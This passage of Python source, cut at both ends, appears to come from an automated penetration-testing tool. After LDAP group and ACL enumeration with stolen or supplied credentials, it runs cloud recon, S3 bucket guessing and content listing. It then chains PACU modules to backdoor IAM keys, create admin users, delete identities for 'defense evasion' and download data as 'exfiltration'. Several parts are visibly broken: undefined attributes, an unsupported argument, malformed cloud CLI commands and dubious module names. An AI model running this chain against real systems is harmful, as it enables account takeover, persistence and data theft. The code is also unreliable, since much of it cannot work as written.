                # Extract users from RID brute force
                users = []
                for line in rid_output.split('\n'):
                    if "SidTypeUser" in line:
                        user = line.split('\\')[1].split()[0]
                        users.append(user)
                if users:
                    results["extracted_users"] = users
        except Exception as e:
            self.logger.error(f"Error in LDAP enumeration: {str(e)}")
        return results

    def _check_privilege_escalation(self, username, password):
        """Check for privilege escalation paths"""
        results = {}
        try:
            if not self.domain:
                self.logger.error("Domain not discovered, cannot check privilege escalation")
                return results
                
            # Format domain for LDAP
            ldap_base = self._format_ldap_base(self.domain)
            if not ldap_base:
                self.logger.error("Failed to format LDAP base")
                return results
                
            self.logger.info(f"Using LDAP base: {ldap_base}")
            
            # Check group memberships
            groups_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}' '(&(objectClass=user)(sAMAccountName={username}))' memberOf"
            groups_output = self.run_command(groups_cmd)
            if groups_output:
                results["user_groups"] = groups_output
            
            # Check for interesting groups
            interesting_groups = ["Domain Admins", "Enterprise Admins", "Developers", "IT", "HelpDesk"]
            for group in interesting_groups:
                group_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}' '(&(objectClass=group)(cn={group}))' member"
                group_output = self.run_command(group_cmd)
                if group_output:
                    results[f"group_{group}"] = group_output
            
            # Check for ACLs
            acl_cmd = f"ldapsearch -x -H ldap://{self.target} -D '{username}@{self.domain}' -w '{password}' -b '{ldap_base}' '(&(objectClass=user)(sAMAccountName={username}))' nTSecurityDescriptor"
            acl_output = self.run_command(acl_cmd)
            if acl_output:
                results["user_acls"] = acl_output
        except Exception as e:
            self.logger.error(f"Error checking privilege escalation: {str(e)}")
        return results

class CloudInformationGathering:
    def __init__(self, target, logger, tool_manager=None, execution_engine=None):
        self.target = target
        self.logger = logger
        self.tool_manager = tool_manager
        self.execution_engine = execution_engine
        self.findings = {
            "recon_ng": {},
            "amass": {},
            "spiderfoot": {},
            "gobuster": {},
            "sublist3r": {},
            "cloud_assets": {},
            "cloud_services": {},
            "cloud_vulnerabilities": {},
            "shodan": {},
            "censys": {},
            "s3_buckets": {},
            "pacu": {},
            "cloud_enum": {}
        }
        self.output_dir = f"reports/cloud_info_gathering_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Load API keys from .env file
        self._load_api_keys()
        
        # PACU session name
        self.pacu_session = f"pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Cloud enum keywords
        self.cloud_enum_keywords = [
            self.target,
            f"{self.target}-backup",
            f"{self.target}-files",
            f"{self.target}-data",
            f"{self.target}-storage",
            f"{self.target}-assets",
            f"{self.target}-media",
            f"{self.target}-uploads",
            f"{self.target}-static",
            f"{self.target}-public",
            f"{self.target}-private",
            f"{self.target}-dev",
            f"{self.target}-prod",
            f"{self.target}-staging",
            f"{self.target}-test"
        ]

    def _load_api_keys(self):
        """Load API keys from .env file"""
        try:
            from dotenv import load_dotenv
            load_dotenv()
            
            self.shodan_api_key = os.getenv('SHODAN_API_KEY')
            self.censys_api_id = os.getenv('CENSYS_API_ID')
            self.censys_api_secret = os.getenv('CENSYS_API_SECRET')
            
            if not self.shodan_api_key:
                self.logger.warning("Shodan API key not found in .env file")
            if not self.censys_api_id or not self.censys_api_secret:
                self.logger.warning("Censys API credentials not found in .env file")
                
        except Exception as e:
            self.logger.error(f"Error loading API keys: {str(e)}")

    def run(self):
        """Run all cloud information gathering tasks"""
        self.logger.info("Starting Cloud Information Gathering phase...")
        
        # 1. Recon-NG Reconnaissance
        self.logger.info("Running Recon-NG reconnaissance...")
        self.findings["recon_ng"] = self.run_recon_ng()
        
        # 2. Amass Enumeration
        self.logger.info("Running Amass enumeration...")
        self.findings["amass"] = self.run_amass()
        
        # 3. SpiderFoot Analysis
        self.logger.info("Running SpiderFoot analysis...")
        self.findings["spiderfoot"] = self.run_spiderfoot()
        
        # 4. Gobuster Directory Scanning
        self.logger.info("Running Gobuster directory scanning...")
        self.findings["gobuster"] = self.run_gobuster()
        
        # 5. Sublist3r Subdomain Enumeration
        self.logger.info("Running Sublist3r subdomain enumeration...")
        self.findings["sublist3r"] = self.run_sublist3r()
        
        # 6. Shodan Intelligence
        self.logger.info("Gathering Shodan intelligence...")
        self.findings["shodan"] = self.run_shodan_scan()
        
        # 7. Censys Intelligence
        self.logger.info("Gathering Censys intelligence...")
        self.findings["censys"] = self.run_censys_scan()
        
        # 8. Cloud Asset Discovery
        self.logger.info("Discovering cloud assets...")
        self.findings["cloud_assets"] = self.discover_cloud_assets()
        
        # 9. Cloud Service Enumeration
        self.logger.info("Enumerating cloud services...")
        self.findings["cloud_services"] = self.enumerate_cloud_services()
        
        # 10. Cloud Vulnerability Assessment
        self.logger.info("Assessing cloud vulnerabilities...")
        self.findings["cloud_vulnerabilities"] = self.assess_cloud_vulnerabilities()
        
        # Add S3 bucket enumeration
        self.logger.info("Enumerating S3 buckets...")
        self.findings["s3_buckets"] = self.enumerate_s3_buckets()
        
        # Add PACU exploitation
        self.logger.info("Running PACU AWS exploitation...")
        self.findings["pacu"] = self.run_pacu_exploitation()
        
        # Add cloud_enum scanning
        self.logger.info("Running cloud_enum scanning...")
        self.findings["cloud_enum"] = self.run_cloud_enum()
        
        # Save findings to JSON
        self._save_findings()
        
        return self.findings

    def _save_findings(self):
        """Save findings to JSON file"""
        output_file = f"{self.output_dir}/cloud_findings.json"
        with open(output_file, 'w') as f:
            json.dump(self.findings, f, indent=4)
        self.logger.info(f"Cloud findings saved to {output_file}")

    def run_command(self, command, capture_output=True):
        """Run a system command and return the output"""
        if self.tool_manager:
            return self.tool_manager.run_tool(command.split()[0], command, capture_output)
        else:
            try:
                result = subprocess.run(command.split(), capture_output=capture_output, text=True)
                if result.returncode != 0:
                    self.logger.error(f"Command failed: {result.stderr}")
                    return None
                return result.stdout
            except Exception as e:
                self.logger.error(f"Error executing command: {str(e)}")
                return None

    def run_recon_ng(self):
        """Run Recon-NG reconnaissance"""
        results = {}
        try:
            # Create workspace
            workspace_cmd = f"recon-ng -w {self.target}_workspace"
            self.run_command(workspace_cmd)
            
            # Load modules
            modules = [
                "recon/domains-hosts/google_site_web",
                "recon/domains-hosts/bing_domain_web",
                "recon/domains-hosts/brute_hosts",
                "recon/domains-hosts/certificate_transparency",
                "recon/domains-hosts/hackertarget",
                "recon/domains-hosts/shodan_hostname",
                "recon/domains-hosts/ssl_san",
                "recon/domains-hosts/threatcrowd",
                "recon/domains-hosts/virustotal",
                "recon/domains-hosts/wayback",
                "recon/domains-hosts/wordpress",
                "recon/domains-hosts/yandex_domain_web"
            ]
            
            for module in modules:
                self.logger.info(f"Running Recon-NG module: {module}")
                module_cmd = f"recon-ng -w {self.target}_workspace -m {module} -o SOURCE={self.target}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            
            # Export results
            export_cmd = f"recon-ng -w {self.target}_workspace -x"
            export_output = self.run_command(export_cmd)
            if export_output:
                results["export"] = export_output
                
        except Exception as e:
            self.logger.error(f"Error in Recon-NG reconnaissance: {str(e)}")
            
        return results

    def run_amass(self):
        """Run Amass enumeration"""
        results = {}
        try:
            # Passive enumeration
            passive_cmd = f"amass enum -passive -d {self.target} -o {self.output_dir}/amass_passive.txt"
            passive_output = self.run_command(passive_cmd)
            if passive_output:
                results["passive"] = passive_output
            
            # Active enumeration
            active_cmd = f"amass enum -active -d {self.target} -o {self.output_dir}/amass_active.txt"
            active_output = self.run_command(active_cmd)
            if active_output:
                results["active"] = active_output
            
            # DNS enumeration
            dns_cmd = f"amass enum -dns -d {self.target} -o {self.output_dir}/amass_dns.txt"
            dns_output = self.run_command(dns_cmd)
            if dns_output:
                results["dns"] = dns_output
                
        except Exception as e:
            self.logger.error(f"Error in Amass enumeration: {str(e)}")
            
        return results

    def run_spiderfoot(self):
        """Run SpiderFoot analysis"""
        results = {}
        try:
            # Start SpiderFoot server
            server_cmd = "spiderfoot -l 127.0.0.1:5001"
            self.run_command(server_cmd, is_background=True)
            
            # Create new scan
            scan_cmd = f"spiderfoot -s {self.target} -m all -o {self.output_dir}/spiderfoot.json"
            scan_output = self.run_command(scan_cmd)
            if scan_output:
                results["scan"] = scan_output
            
            # Export results
            export_cmd = f"spiderfoot -s {self.target} -e json -o {self.output_dir}/spiderfoot_export.json"
            export_output = self.run_command(export_cmd)
            if export_output:
                results["export"] = export_output
                
        except Exception as e:
            self.logger.error(f"Error in SpiderFoot analysis: {str(e)}")
            
        return results

    def run_gobuster(self):
        """Run Gobuster directory scanning"""
        results = {}
        try:
            # Directory scanning
            dir_cmd = f"gobuster dir -u {self.target} -w /usr/share/wordlists/dirb/common.txt -o {self.output_dir}/gobuster_dirs.txt"
            dir_output = self.run_command(dir_cmd)
            if dir_output:
                results["directories"] = dir_output
            
            # DNS subdomain scanning
            dns_cmd = f"gobuster dns -d {self.target} -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -o {self.output_dir}/gobuster_dns.txt"
            dns_output = self.run_command(dns_cmd)
            if dns_output:
                results["dns"] = dns_output
            
            # VHost scanning
            vhost_cmd = f"gobuster vhost -u {self.target} -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt -o {self.output_dir}/gobuster_vhosts.txt"
            vhost_output = self.run_command(vhost_cmd)
            if vhost_output:
                results["vhosts"] = vhost_output
                
        except Exception as e:
            self.logger.error(f"Error in Gobuster scanning: {str(e)}")
            
        return results

    def run_sublist3r(self):
        """Run Sublist3r subdomain enumeration"""
        results = {}
        try:
            # Basic enumeration
            basic_cmd = f"sublist3r -d {self.target} -o {self.output_dir}/sublist3r.txt"
            basic_output = self.run_command(basic_cmd)
            if basic_output:
                results["basic"] = basic_output
            
            # Enumeration with all sources
            all_cmd = f"sublist3r -d {self.target} -b -t 100 -o {self.output_dir}/sublist3r_all.txt"
            all_output = self.run_command(all_cmd)
            if all_output:
                results["all_sources"] = all_output
                
        except Exception as e:
            self.logger.error(f"Error in Sublist3r enumeration: {str(e)}")
            
        return results

    def discover_cloud_assets(self):
        """Discover cloud assets"""
        results = {}
        try:
            # Check for AWS assets
            aws_cmd = f"aws-vault exec default -- aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,Tags[?Key==`Name`].Value|[0]]' --output json > {self.output_dir}/aws_instances.json"
            aws_output = self.run_command(aws_cmd)
            if aws_output:
                results["aws_instances"] = aws_output
            
            # Check for Azure assets
            azure_cmd = f"az vm list --query '[].{Name:name, ResourceGroup:resourceGroup, Location:location}' --output json > {self.output_dir}/azure_vms.json"
            azure_output = self.run_command(azure_cmd)
            if azure_output:
                results["azure_vms"] = azure_output
            
            # Check for GCP assets
            gcp_cmd = f"gcloud compute instances list --format=json > {self.output_dir}/gcp_instances.json"
            gcp_output = self.run_command(gcp_cmd)
            if gcp_output:
                results["gcp_instances"] = gcp_output
                
        except Exception as e:
            self.logger.error(f"Error discovering cloud assets: {str(e)}")
            
        return results

    def enumerate_cloud_services(self):
        """Enumerate cloud services"""
        results = {}
        try:
            # AWS services
            aws_services = [
                "s3",
                "lambda",
                "ec2",
                "rds",
                "dynamodb",
                "cloudfront",
                "route53"
            ]
            
            for service in aws_services:
                service_cmd = f"aws-vault exec default -- aws {service} list-{service}s --output json > {self.output_dir}/aws_{service}.json"
                service_output = self.run_command(service_cmd)
                if service_output:
                    results[f"aws_{service}"] = service_output
            
            # Azure services
            azure_services = [
                "storage",
                "functionapp",
                "webapp",
                "sql",
                "cosmosdb",
                "cdn",
                "dns"
            ]
            
            for service in azure_services:
                service_cmd = f"az {service} list --output json > {self.output_dir}/azure_{service}.json"
                service_output = self.run_command(service_cmd)
                if service_output:
                    results[f"azure_{service}"] = service_output
            
            # GCP services
            gcp_services = [
                "storage",
                "functions",
                "compute",
                "sql",
                "datastore",
                "cdn",
                "dns"
            ]
            
            for service in gcp_services:
                service_cmd = f"gcloud {service} list --format=json > {self.output_dir}/gcp_{service}.json"
                service_output = self.run_command(service_cmd)
                if service_output:
                    results[f"gcp_{service}"] = service_output
                    
        except Exception as e:
            self.logger.error(f"Error enumerating cloud services: {str(e)}")
            
        return results

    def assess_cloud_vulnerabilities(self):
        """Assess cloud vulnerabilities"""
        results = {}
        try:
            # AWS security checks
            aws_security_cmd = f"aws-vault exec default -- aws securityhub get-findings --output json > {self.output_dir}/aws_security.json"
            aws_security_output = self.run_command(aws_security_cmd)
            if aws_security_output:
                results["aws_security"] = aws_security_output
            
            # Azure security checks
            azure_security_cmd = f"az security assessment list --output json > {self.output_dir}/azure_security.json"
            azure_security_output = self.run_command(azure_security_cmd)
            if azure_security_output:
                results["azure_security"] = azure_security_output
            
            # GCP security checks
            gcp_security_cmd = f"gcloud security-center findings list --format=json > {self.output_dir}/gcp_security.json"
            gcp_security_output = self.run_command(gcp_security_cmd)
            if gcp_security_output:
                results["gcp_security"] = gcp_security_output
                
        except Exception as e:
            self.logger.error(f"Error assessing cloud vulnerabilities: {str(e)}")
            
        return results

    def run_shodan_scan(self):
        """Run Shodan intelligence gathering"""
        results = {}
        try:
            if not self.shodan_api_key:
                self.logger.error("Shodan API key not configured")
                return results

            import shodan
            
            # Initialize Shodan API
            api = shodan.Shodan(self.shodan_api_key)
            
            # Host information
            try:
                host_info = api.host(self.target)
                results["host_info"] = host_info
                
                # Save detailed host info
                with open(f"{self.output_dir}/shodan_host_info.json", 'w') as f:
                    json.dump(host_info, f, indent=4)
            except shodan.APIError as e:
                self.logger.error(f"Shodan host lookup error: {str(e)}")
            
            # Search for related hosts
            try:
                search_query = f'hostname:{self.target} OR ssl:{self.target}'
                search_results = api.search(search_query, limit=100)
                results["related_hosts"] = search_results
                
                # Save search results
                with open(f"{self.output_dir}/shodan_search_results.json", 'w') as f:
                    json.dump(search_results, f, indent=4)
            except shodan.APIError as e:
                self.logger.error(f"Shodan search error: {str(e)}")
            
            # DNS information
            try:
                dns_info = api.dns.domain_info(self.target)
                results["dns_info"] = dns_info
                
                # Save DNS info
                with open(f"{self.output_dir}/shodan_dns_info.json", 'w') as f:
                    json.dump(dns_info, f, indent=4)
            except shodan.APIError as e:
                self.logger.error(f"Shodan DNS lookup error: {str(e)}")
            
            # SSL certificate information
            try:
                ssl_info = api.ssl.search(f'ssl:{self.target}')
                results["ssl_info"] = ssl_info
                
                # Save SSL info
                with open(f"{self.output_dir}/shodan_ssl_info.json", 'w') as f:
                    json.dump(ssl_info, f, indent=4)
            except shodan.APIError as e:
                self.logger.error(f"Shodan SSL lookup error: {str(e)}")
                
        except Exception as e:
            self.logger.error(f"Error in Shodan scanning: {str(e)}")
            
        return results

    def run_censys_scan(self):
        """Run Censys intelligence gathering"""
        results = {}
        try:
            if not self.censys_api_id or not self.censys_api_secret:
                self.logger.error("Censys API credentials not configured")
                return results

            from censys.search import CensysHosts
            from censys.common.exceptions import CensysNotFoundException
            
            # Initialize Censys API
            censys_hosts = CensysHosts(api_id=self.censys_api_id, api_secret=self.censys_api_secret)
            
            # Search for hosts
            try:
                search_query = f'names: {self.target} OR dns.names: {self.target}'
                search_results = list(censys_hosts.search(search_query, max_records=100))
                results["host_search"] = search_results
                
                # Save search results
                with open(f"{self.output_dir}/censys_host_search.json", 'w') as f:
                    json.dump(search_results, f, indent=4)
            except CensysNotFoundException:
                self.logger.warning(f"No Censys results found for {self.target}")
            except Exception as e:
                self.logger.error(f"Censys search error: {str(e)}")
            
            # Get detailed host information
            try:
                host_info = censys_hosts.view(self.target)
                results["host_info"] = host_info
                
                # Save host info
                with open(f"{self.output_dir}/censys_host_info.json", 'w') as f:
                    json.dump(host_info, f, indent=4)
            except CensysNotFoundException:
                self.logger.warning(f"No detailed Censys information found for {self.target}")
            except Exception as e:
                self.logger.error(f"Censys host lookup error: {str(e)}")
            
            # Search for certificates
            try:
                cert_query = f'parsed.subject_dn: {self.target}'
                cert_results = list(censys_hosts.search(cert_query, max_records=100))
                results["certificate_search"] = cert_results
                
                # Save certificate results
                with open(f"{self.output_dir}/censys_certificates.json", 'w') as f:
                    json.dump(cert_results, f, indent=4)
            except CensysNotFoundException:
                self.logger.warning(f"No certificate information found for {self.target}")
            except Exception as e:
                self.logger.error(f"Censys certificate search error: {str(e)}")
                
        except Exception as e:
            self.logger.error(f"Error in Censys scanning: {str(e)}")
            
        return results

    def enumerate_s3_buckets(self):
        """Enumerate and check S3 buckets"""
        results = {
            "direct_buckets": {},
            "regional_buckets": {},
            "organization_buckets": {},
            "public_buckets": {},
            "accessible_buckets": {}
        }
        
        try:
            # 1. Check direct bucket names
            self.logger.info("Checking direct bucket names...")
            direct_buckets = self._check_direct_bucket_names()
            results["direct_buckets"] = direct_buckets
            
            # 2. Check regional bucket names
            self.logger.info("Checking regional bucket names...")
            regional_buckets = self._check_regional_bucket_names()
            results["regional_buckets"] = regional_buckets
            
            # 3. Check organization bucket names
            self.logger.info("Checking organization bucket names...")
            org_buckets = self._check_organization_bucket_names()
            results["organization_buckets"] = org_buckets
            
            # 4. Check for public buckets
            self.logger.info("Checking for public buckets...")
            public_buckets = self._check_public_buckets()
            results["public_buckets"] = public_buckets
            
            # 5. Check bucket accessibility
            self.logger.info("Checking bucket accessibility...")
            accessible_buckets = self._check_bucket_accessibility()
            results["accessible_buckets"] = accessible_buckets
            
            # Save results
            with open(f"{self.output_dir}/s3_bucket_enumeration.json", 'w') as f:
                json.dump(results, f, indent=4)
                
        except Exception as e:
            self.logger.error(f"Error in S3 bucket enumeration: {str(e)}")
            
        return results

    def _check_direct_bucket_names(self):
        """Check for direct bucket names"""
        results = {}
        bucket_patterns = [
            f"{self.target}",
            f"{self.target}-backup",
            f"{self.target}-files",
            f"{self.target}-data",
            f"{self.target}-storage",
            f"{self.target}-assets",
            f"{self.target}-media",
            f"{self.target}-uploads",
            f"{self.target}-static",
            f"{self.target}-public",
            f"{self.target}-private",
            f"{self.target}-dev",
            f"{self.target}-prod",
            f"{self.target}-staging",
            f"{self.target}-test"
        ]
        
        for bucket_name in bucket_patterns:
            try:
                # Check if bucket exists and is accessible
                url = f"https://{bucket_name}.s3.amazonaws.com"
                response = requests.head(url)
                
                if response.status_code == 200:
                    results[bucket_name] = {
                        "url": url,
                        "status": "exists",
                        "public": True
                    }
                    
                    # Try to list contents
                    try:
                        aws_cmd = f"aws s3 ls s3://{bucket_name}/"
                        contents = self.run_command(aws_cmd)
                        if contents:
                            results[bucket_name]["contents"] = contents
                    except:
                        pass
                        
            except Exception as e:
                self.logger.debug(f"Error checking bucket {bucket_name}: {str(e)}")
                
        return results

    def _check_regional_bucket_names(self):
        """Check for regional bucket names"""
        results = {}
        
        for region in self.aws_regions:
            bucket_patterns = [
                f"s3-{region}.amazonaws.com/{self.target}",
                f"s3-{region}.amazonaws.com/{self.target}-backup",
                f"s3-{region}.amazonaws.com/{self.target}-files",
                f"s3-{region}.amazonaws.com/{self.target}-data"
            ]
            
            for bucket_path in bucket_patterns:
                try:
                    url = f"https://{bucket_path}"
                    response = requests.head(url)
                    
                    if response.status_code == 200:
                        results[bucket_path] = {
                            "url": url,
                            "status": "exists",
                            "public": True,
                            "region": region
                        }
                        
                        # Try to list contents
                        try:
                            bucket_name = bucket_path.split('/')[-1]
                            aws_cmd = f"aws s3 ls s3://{bucket_name}/"
                            contents = self.run_command(aws_cmd)
                            if contents:
                                results[bucket_path]["contents"] = contents
                        except:
                            pass
                            
                except Exception as e:
                    self.logger.debug(f"Error checking regional bucket {bucket_path}: {str(e)}")
                    
        return results

    def _check_organization_bucket_names(self):
        """Check for organization bucket names"""
        results = {}
        
        # Common organization patterns
        org_patterns = [
            f"{self.target}-org",
            f"{self.target}-company",
            f"{self.target}-corp",
            f"{self.target}-enterprise",
            f"{self.target}-internal",
            f"{self.target}-shared",
            f"{self.target}-common",
            f"{self.target}-global"
        ]
        
        for bucket_name in org_patterns:
            try:
                # Check direct bucket
                url = f"https://{bucket_name}.s3.amazonaws.com"
                response = requests.head(url)
                
                if response.status_code == 200:
                    results[bucket_name] = {
                        "url": url,
                        "status": "exists",
                        "public": True
                    }
                    
                    # Try to list contents
                    try:
                        aws_cmd = f"aws s3 ls s3://{bucket_name}/"
                        contents = self.run_command(aws_cmd)
                        if contents:
                            results[bucket_name]["contents"] = contents
                    except:
                        pass
                        
            except Exception as e:
                self.logger.debug(f"Error checking org bucket {bucket_name}: {str(e)}")
                
        return results

    def _check_public_buckets(self):
        """Check for public buckets"""
        results = {}
        
        # Common public bucket patterns
        public_patterns = [
            f"{self.target}-public",
            f"{self.target}-static",
            f"{self.target}-assets",
            f"{self.target}-media",
            f"{self.target}-uploads",
            f"{self.target}-files",
            f"{self.target}-downloads",
            f"{self.target}-content",
            f"{self.target}-images",
            f"{self.target}-docs"
        ]
        
        for bucket_name in public_patterns:
            try:
                # Check if bucket exists and is public
                url = f"https://{bucket_name}.s3.amazonaws.com"
                response = requests.head(url)
                
                if response.status_code == 200:
                    # Check if bucket is public
                    try:
                        aws_cmd = f"aws s3api get-bucket-acl --bucket {bucket_name}"
                        acl = self.run_command(aws_cmd)
                        
                        if acl and "AllUsers" in acl:
                            results[bucket_name] = {
                                "url": url,
                                "status": "exists",
                                "public": True,
                                "acl": acl
                            }
                            
                            # Try to list contents
                            try:
                                ls_cmd = f"aws s3 ls s3://{bucket_name}/"
                                contents = self.run_command(ls_cmd)
                                if contents:
                                    results[bucket_name]["contents"] = contents
                            except:
                                pass
                    except:
                        pass
                        
            except Exception as e:
                self.logger.debug(f"Error checking public bucket {bucket_name}: {str(e)}")
                
        return results

    def _check_bucket_accessibility(self):
        """Check bucket accessibility"""
        results = {}
        
        # Combine all discovered bucket names
        all_buckets = set()
        for category in self.findings["s3_buckets"].values():
            if isinstance(category, dict):
                all_buckets.update(category.keys())
        
        for bucket_name in all_buckets:
            try:
                # Check various access methods
                access_methods = {
                    "http": f"https://{bucket_name}.s3.amazonaws.com",
                    "s3": f"s3://{bucket_name}/",
                    "s3api": f"aws s3api head-bucket --bucket {bucket_name}"
                }
                
                bucket_results = {}
                
                # Check HTTP access
                try:
                    response = requests.head(access_methods["http"])
                    bucket_results["http"] = {
                        "status_code": response.status_code,
                        "headers": dict(response.headers)
                    }
                except:
                    pass
                
                # Check S3 CLI access
                try:
                    ls_cmd = f"aws s3 ls {access_methods['s3']}"
                    ls_output = self.run_command(ls_cmd)
                    if ls_output:
                        bucket_results["s3_cli"] = {
                            "status": "accessible",
                            "contents": ls_output
                        }
                except:
                    pass
                
                # Check S3API access
                try:
                    api_cmd = access_methods["s3api"]
                    api_output = self.run_command(api_cmd)
                    if api_output:
                        bucket_results["s3api"] = {
                            "status": "accessible",
                            "details": api_output
                        }
                except:
                    pass
                
                if bucket_results:
                    results[bucket_name] = bucket_results
                    
            except Exception as e:
                self.logger.debug(f"Error checking bucket accessibility for {bucket_name}: {str(e)}")
                
        return results 

    def run_pacu_exploitation(self):
        """Run PACU AWS exploitation framework"""
        results = {
            "initial_access": {},
            "privilege_escalation": {},
            "persistence": {},
            "defense_evasion": {},
            "credential_access": {},
            "discovery": {},
            "lateral_movement": {},
            "collection": {},
            "exfiltration": {},
            "impact": {}
        }
        
        try:
            # Initialize PACU session
            self.logger.info("Initializing PACU session...")
            self._init_pacu_session()
            
            # Run initial access modules
            self.logger.info("Running initial access modules...")
            results["initial_access"] = self._run_pacu_initial_access()
            
            # Run privilege escalation modules
            self.logger.info("Running privilege escalation modules...")
            results["privilege_escalation"] = self._run_pacu_privilege_escalation()
            
            # Run persistence modules
            self.logger.info("Running persistence modules...")
            results["persistence"] = self._run_pacu_persistence()
            
            # Run defense evasion modules
            self.logger.info("Running defense evasion modules...")
            results["defense_evasion"] = self._run_pacu_defense_evasion()
            
            # Run credential access modules
            self.logger.info("Running credential access modules...")
            results["credential_access"] = self._run_pacu_credential_access()
            
            # Run discovery modules
            self.logger.info("Running discovery modules...")
            results["discovery"] = self._run_pacu_discovery()
            
            # Run lateral movement modules
            self.logger.info("Running lateral movement modules...")
            results["lateral_movement"] = self._run_pacu_lateral_movement()
            
            # Run collection modules
            self.logger.info("Running collection modules...")
            results["collection"] = self._run_pacu_collection()
            
            # Run exfiltration modules
            self.logger.info("Running exfiltration modules...")
            results["exfiltration"] = self._run_pacu_exfiltration()
            
            # Run impact modules
            self.logger.info("Running impact modules...")
            results["impact"] = self._run_pacu_impact()
            
            # Save PACU results
            with open(f"{self.output_dir}/pacu_results.json", 'w') as f:
                json.dump(results, f, indent=4)
                
        except Exception as e:
            self.logger.error(f"Error in PACU exploitation: {str(e)}")
            
        return results

    def _init_pacu_session(self):
        """Initialize PACU session"""
        try:
            # Create new PACU session
            init_cmd = f"pacu --session {self.pacu_session} --new"
            self.run_command(init_cmd)
            
            # Import AWS credentials if available
            if hasattr(self, 'aws_access_key') and hasattr(self, 'aws_secret_key'):
                import_cmd = f"pacu --session {self.pacu_session} --import-keys {self.aws_access_key} {self.aws_secret_key}"
                self.run_command(import_cmd)
                
        except Exception as e:
            self.logger.error(f"Error initializing PACU session: {str(e)}")

    def _run_pacu_initial_access(self):
        """Run PACU initial access modules"""
        results = {}
        modules = [
            "iam__enum_users_roles_policies_groups",
            "iam__enum_permissions",
            "iam__backdoor_users_keys",
            "iam__backdoor_users_password",
            "iam__create_admin_user",
            "iam__privesc_scan"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_privilege_escalation(self):
        """Run PACU privilege escalation modules"""
        results = {}
        modules = [
            "iam__privesc_scan",
            "iam__privesc_by_rollback",
            "iam__privesc_by_attachment",
            "iam__privesc_by_assume_role",
            "iam__privesc_by_console_access",
            "iam__privesc_by_managed_policies"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_persistence(self):
        """Run PACU persistence modules"""
        results = {}
        modules = [
            "iam__backdoor_users_keys",
            "iam__backdoor_users_password",
            "iam__create_admin_user",
            "iam__create_iam_user",
            "iam__create_iam_role"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_defense_evasion(self):
        """Run PACU defense evasion modules"""
        results = {}
        modules = [
            "iam__delete_login_profile",
            "iam__delete_user",
            "iam__delete_role",
            "iam__delete_policy",
            "iam__delete_group"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_credential_access(self):
        """Run PACU credential access modules"""
        results = {}
        modules = [
            "iam__enum_users_roles_policies_groups",
            "iam__enum_permissions",
            "iam__privesc_scan",
            "iam__backdoor_users_keys",
            "iam__backdoor_users_password"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_discovery(self):
        """Run PACU discovery modules"""
        results = {}
        modules = [
            "iam__enum_users_roles_policies_groups",
            "iam__enum_permissions",
            "iam__privesc_scan",
            "ec2__enum",
            "s3__enum",
            "lambda__enum"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_lateral_movement(self):
        """Run PACU lateral movement modules"""
        results = {}
        modules = [
            "iam__privesc_by_assume_role",
            "iam__privesc_by_console_access",
            "iam__privesc_by_managed_policies",
            "ec2__enum",
            "lambda__enum"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_collection(self):
        """Run PACU collection modules"""
        results = {}
        modules = [
            "s3__enum",
            "s3__download",
            "ec2__enum",
            "lambda__enum",
            "rds__enum"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_exfiltration(self):
        """Run PACU exfiltration modules"""
        results = {}
        modules = [
            "s3__download",
            "s3__upload",
            "lambda__download",
            "ec2__download"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results

    def _run_pacu_impact(self):
        """Run PACU impact modules"""
        results = {}
        modules = [
            "iam__delete_login_profile",
